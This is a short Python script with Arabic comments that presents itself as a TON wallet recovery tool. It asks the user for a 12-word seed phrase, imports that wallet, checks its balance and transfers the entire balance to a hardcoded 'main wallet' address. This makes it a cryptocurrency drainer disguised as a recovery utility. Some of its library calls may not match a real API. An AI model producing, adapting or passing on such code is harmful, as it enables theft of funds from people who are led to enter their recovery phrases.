from ton import TonlibClient
import asyncio

# عنوان المحفظة الرئيسية التي سيتم تحويل الرصيد إليها
MAIN_WALLET_ADDRESS = "UQCVPmP89iEzCRmsOHM4O51_WApSwmEy-kVux0wWP12t-nWg"

# دالة للتحقق من كلمات الاسترداد والوصول إلى المحفظة
async def recover_wallet(passphrases):
    client = TonlibClient()
    await client.init()

    # ترتيب كلمات الاسترداد
    seed_phrases = passphrases.split()  # assuming passphrases is a space-separated string of 12 words
    wallet = await client.import_wallet(seed_phrases)

    # عرض الرصيد
    balance = await client.get_balance(wallet)
    print(f"رصيد المحفظة: {balance} TON")

    # تحويل الرصيد إلى المحفظة الرئيسية
    if balance > 0:
        transaction = await client.send_money(wallet, MAIN_WALLET_ADDRESS, balance)
        print("تم التحويل بنجاح:", transaction)
    else:
        print("الرصيد غير كافٍ لإجراء التحويل")

    await client.close()

# تأكد من أن لديك asyncio لتشغيل الدالة بشكل غير متزامن
passphrases = input("أدخل الكلمات ال12: ")
asyncio.run(recover_wallet(passphrases))
